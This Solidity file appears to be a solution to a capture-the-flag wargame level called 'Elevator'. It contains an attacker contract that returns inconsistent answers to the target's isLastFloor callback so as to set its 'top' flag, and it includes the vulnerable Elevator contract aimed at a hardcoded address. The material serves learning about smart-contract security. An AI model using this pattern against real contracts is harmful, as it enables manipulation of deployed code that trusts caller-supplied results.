// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Building{
    Elevator public EL = Elevator(0x060bd6502BE8E051466937D4D6a2F97B61EcD6eA);
    bool public switcheroo = false;

    function hack() public {
        EL.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        if (! switcheroo){
            switcheroo = true;
            return false;
        }
        else{
            switcheroo = false;
            return true;
        }
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}